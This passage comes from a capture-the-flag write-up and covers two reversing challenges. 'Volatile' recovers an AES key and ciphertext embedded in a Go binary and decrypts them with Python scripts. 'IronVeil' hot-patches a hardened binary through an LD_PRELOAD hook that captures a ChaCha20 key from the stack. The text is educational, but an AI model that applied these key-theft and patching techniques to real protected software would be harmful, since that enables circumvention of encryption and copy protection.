<p>N.B.: This exploit is practically the same of <a href="https://pascalctf.github.io/en/ctf/ctfatac/#minecrafty"><code>the original Minecrafty</code></a></p>
</blockquote>
<h3 id="volatile">Volatile<a hidden class="anchor" aria-hidden="true" href="#volatile">#</a></h3>
<h4 id="analysis-16">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-16">#</a></h4>
<p>While analyzing the file I understood that this was a binary written in GO where the function <code>main.main</code> at <code>0x5309e0</code> builded an <code>afero.MemMapFs</code> over an embedded file table and reading two paths (<code>unk_5BCEE4</code> -&gt; <code>e/f1</code>, <code>unk_5BCEE8</code> -&gt; <code>e/f2</code>) via <code>github_com_spf13_afero_ReadFile</code>. The table itself is a <code>[]internal/embed/file</code> slice at <code>0x604360</code>, whose header (<code>ptr=0x604378, len=3</code>) points at three entries: directory <code>e/</code>, and files <code>e/f1</code> and <code>e/f2</code>. Each entry stores the Go string pointer/length for both the path and the file data, so dumping the strings at those addresses recovers the payloads. <code>e/f1</code> turned out to be the literal 32-byte ASCII string <code>6b90408b52818c16e4e3fd2e8acb40d6</code>, while <code>e/f2</code> held a 128-byte base64 ciphertext beginning with <code>RLJwwmLd1PETlctb...PlPGI</code>.</p>
<p>While continuing to analyze the <code>main.main</code> function I understood that it called <code>encoding/base64.StdEncoding.DecodeString</code> on <code>e/f2</code>, taking the first 16 decoded bytes as an IV, and decrypting the remainder with <code>crypto/aes.NewCipher</code> + <code>cipher.NewCBCDecrypter</code> using the raw bytes from <code>e/f1</code>. The plaintext was then written to <code>/uwu/flag.txt</code>, so recreating that routine offline reproduces the flag without needing to run the target binary.</p>
<h4 id="solution-13">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-13">#</a></h4>
<ol>
<li>I used <code>extract_embed_fs.py</code> to parse the slice at <code>0x604360</code> and dump <code>extracted/e/f1</code> and <code>extracted/e/f2</code> straight from <code>.rodata</code>. The script converts the virtual addresses to file offsets using the <code>.rodata</code> base (<code>0x56b000</code>) observed in IDA, so no manual hex-editing is required:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> Downloads
</span></span><span class="line"><span class="cl">python extract_embed_fs.py
</span></span></code></pre></div></li>
<li>I decrypted <code>e/f2</code> with the AES-CBC flow mirrored from <code>main.main</code>. <code>decrypt_flag.py</code> base64-decodes the blob, splits IV+ciphertext, decrypts, PKCS#7-unpads, prints the plaintext, and drops it where the binary would have been (<code>uwu/flag.txt</code>):
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python decrypt_flag.py
</span></span></code></pre></div></li>
</ol>
<p>Thus providing the right flag as the binary would have.</p>
<h4 id="scripts">Scripts<a hidden class="anchor" aria-hidden="true" href="#scripts">#</a></h4>
<h5 id="extract-embed-fs">Extract Embed FS<a hidden class="anchor" aria-hidden="true" href="#extract-embed-fs">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RODATA_VADDR</span> <span class="o">=</span> <span class="mh">0x56B000</span>
</span></span><span class="line"><span class="cl"><span class="n">RODATA_FOFFSET</span> <span class="o">=</span> <span class="mh">0x16B000</span>
</span></span><span class="line"><span class="cl"><span class="n">FILE_SLICE_ADDR</span> <span class="o">=</span> <span class="mh">0x604360</span>
</span></span><span class="line"><span class="cl"><span class="n">FILE_ENTRY_SIZE</span> <span class="o">=</span> <span class="mi">48</span>  <span class="c1"># sizeof(string) + sizeof(string) + 16-byte hash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">vaddr_to_offset</span><span class="p">(</span><span class="n">vaddr</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">vaddr</span> <span class="o">&lt;</span> <span class="n">RODATA_VADDR</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;virtual address 0x</span><span class="si">{</span><span class="n">vaddr</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2"> is outside .rodata&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">RODATA_FOFFSET</span> <span class="o">+</span> <span class="p">(</span><span class="n">vaddr</span> <span class="o">-</span> <span class="n">RODATA_VADDR</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_slice_header</span><span class="p">(</span><span class="n">blob</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">blob</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">24</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;expected 24-byte slice header&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;QQQ&#34;</span><span class="p">,</span> <span class="n">blob</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_string</span><span class="p">(</span><span class="n">fh</span><span class="p">,</span> <span class="n">ptr</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">length</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">fh</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">ptr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">length</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_bytes</span><span class="p">(</span><span class="n">fh</span><span class="p">,</span> <span class="n">ptr</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">length</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">fh</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">ptr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_entries</span><span class="p">(</span><span class="n">binary</span><span class="p">:</span> <span class="n">Path</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">[</span><span class="nb">tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">   <span class="n">entries</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]]</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">   <span class="k">with</span> <span class="n">binary</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">fh</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">FILE_SLICE_ADDR</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">      <span class="n">ptr</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">capacity</span> <span class="o">=</span> <span class="n">read_slice_header</span><span class="p">(</span><span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">24</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="n">length</span> <span class="o">!=</span> <span class="n">capacity</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">         <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;embed.FS file table length mismatch&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">table_off</span> <span class="o">=</span> <span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">         <span class="n">fh</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">table_off</span> <span class="o">+</span> <span class="n">idx</span> <span class="o">*</span> <span class="n">FILE_ENTRY_SIZE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">chunk</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">FILE_ENTRY_SIZE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">path_ptr</span><span class="p">,</span> <span class="n">path_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s2">&#34;&lt;QQ&#34;</span><span class="p">,</span> <span class="n">chunk</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s2">&#34;&lt;QQ&#34;</span><span class="p">,</span> <span class="n">chunk</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">         <span class="n">path</span> <span class="o">=</span> <span class="n">read_string</span><span class="p">(</span><span class="n">fh</span><span class="p">,</span> <span class="n">path_ptr</span><span class="p">,</span> <span class="n">path_len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="n">data_len</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">read_bytes</span><span class="p">(</span><span class="n">fh</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">entries</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">path</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">entries</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="vm">__doc__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--binary&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="s2">&#34;volatile&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;path to the Go binary (default: ./volatile)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--outdir&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s2">&#34;extracted&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;directory for extracted payloads (default: ./extracted)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">args</span><span class="o">.</span><span class="n">outdir</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">entries</span> <span class="o">=</span> <span class="n">parse_entries</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="k">for</span> <span class="n">path</span><span class="p">,</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">entries</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">         <span class="k">continue</span>
</span></span><span class="line"><span class="cl">      <span class="n">out_path</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">outdir</span> <span class="o">/</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl">      <span class="n">out_path</span><span class="o">.</span><span class="n">parent</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">out_path</span><span class="o">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Wrote </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">:</span><span class="s2">4d</span><span class="si">}</span><span class="s2"> bytes -&gt; </span><span class="si">{</span><span class="n">out_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h5 id="decrypt-file">Decrypt file<a hidden class="anchor" aria-hidden="true" href="#decrypt-file">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="n">Path</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">data</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> is empty&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">block</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">pad_len</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">pad_len</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">pad_len</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;invalid padding&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">block</span><span class="p">[</span><span class="o">-</span><span class="n">pad_len</span><span class="p">:]</span> <span class="o">!=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">pad_len</span><span class="p">])</span> <span class="o">*</span> <span class="n">pad_len</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;padding bytes mismatch&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">block</span><span class="p">[:</span><span class="o">-</span><span class="n">pad_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="vm">__doc__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--key&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s2">&#34;extracted/e/f1&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;path to e/f1 (the raw 32-byte AES key)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--blob&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s2">&#34;extracted/e/f2&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;path to e/f2 (base64 IV+ciphertext blob)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--out&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s2">&#34;uwu/flag.txt&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;output path for the recovered flag (default: uwu/flag.txt)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">key</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">blob</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">blob</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">   <span class="n">iv</span><span class="p">,</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">blob</span><span class="p">[:</span><span class="mi">16</span><span class="p">],</span> <span class="n">blob</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">   <span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">plaintext</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">aes</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">args</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">parent</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">args</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag written to </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">out</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="ironveil">IronVeil<a hidden class="anchor" aria-hidden="true" href="#ironveil">#</a></h3>
<h4 id="analysis-17">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-17">#</a></h4>
<p>We received a stripped ELF64 binary (<code>ironveil</code>) and an encrypted blob (<code>flag.txt.encrypted</code>). Running the binary encrypts any named file and emits an <code>IRONVEIL_ENC_V3</code> container:</p>
<ul>
<li><code>00..0f</code>: <code>&quot;IRONVEIL_ENC_V3\0&quot;</code></li>
<li><code>10..1b</code>: 12-byte nonce</li>
<li><code>1c..end-10</code>: ciphertext</li>
<li><code>last 16</code>: Poly1305 tag
(Plaintext length = total size - 44 bytes.)</li>
</ul>
<p>Static recon (main at <code>0xfb60</code>) showed heavy hardening: poll/stack checks, a per-thread VM, and <code>ChaCha20-Poly1305</code>. Strings near <code>0x59c8a</code> (&ldquo;Key derived using VM program with 101 opcodes&rdquo;) imply the key is computed on the fly. The pipeline is driven by <code>sub_9F20</code>, which feeds an AVX ChaCha core (<code>sub_1B4A0</code>) using the <code>&quot;expand 32-byte k&quot;</code> constant at <code>0x572c0</code>.</p>
<p>Naive ideas failed:</p>
<ul>
<li>Hashing the file mtime (<code>Fri, 07 Nov 2025 23:35:40 GMT</code>) doesn&rsquo;t reproduce the key; the VM mixes extra hidden state.</li>
<li><code>LD_PRELOAD</code> memcpy/sniffer hooks dump lots of memory but the program zeroes buffers before printing.</li>
<li>Snapshots catch only zeroes because the key lives in registers most of the time.</li>
</ul>
<p>Key observation: right before calling the ChaCha block, <code>sub_9F20</code> briefly spills the 32-byte key to its stack at <code>[rsp+0xa0]</code>. That window is enough to steal it.</p>
<h4 id="solution-14">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-14">#</a></h4>
<p>We used an <code>LD_PRELOAD</code> helper to hot-patch the binary and intercept that spill:</p>
<ol>
<li>Locate PIE base via <code>/proc/self/maps</code>.</li>
<li>Overwrite the instruction at <code>PIE+0xd758</code> with <code>movabs rax,&lt;hook&gt;; call rax</code>, temporarily replacing the original <code>movl $0,0xc0(%rsp)</code>.</li>
<li>In a naked hook stub, copy 32 bytes from <code>[rsp+0xa0]</code> to a global buffer, replay the displaced instruction, and <code>ret</code>.</li>
<li>A lightweight <code>write()</code> hook prints the key once when it sees the &ldquo;Key derived using &hellip;&rdquo; line.</li>
</ol>
<p>Running any encryption through the preloader yields:</p>
<pre tabindex="0"><code>[keyhook] base=0x559fe85f3000
[keyhook] derived key 7442ff3d553fdd19a2d65ce1c0786e40ea23c668e1982b911d79d5e492d71e95
File encrypted successfully: sample.txt.encrypted
Key derived using VM program with 101 opcodes
</code></pre><p>With the 32-byte ChaCha key in hand, decryption is straightforward: parse the format, extract nonce/ciphertext/tag, and run <code>ChaCha20-Poly1305</code> with empty AAD.</p>
<h4 id="script-12">Script<a hidden class="anchor" aria-hidden="true" href="#script-12">#</a></h4>
<p>Build and run the preloader to exfiltrate the key:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ironveil_lab
</span></span><span class="line"><span class="cl">gcc -shared -fPIC keyhook.c -o keyhook.so -ldl
</span></span><span class="line"><span class="cl"><span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="nv">$PWD</span>/keyhook.so ./ironveil sample.txt
</span></span></code></pre></div><p>Decrypt <code>flag.txt.encrypted</code> offline:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.aead</span> <span class="kn">import</span> <span class="n">ChaCha20Poly1305</span>
</span></span><span class="line"><span class="cl">
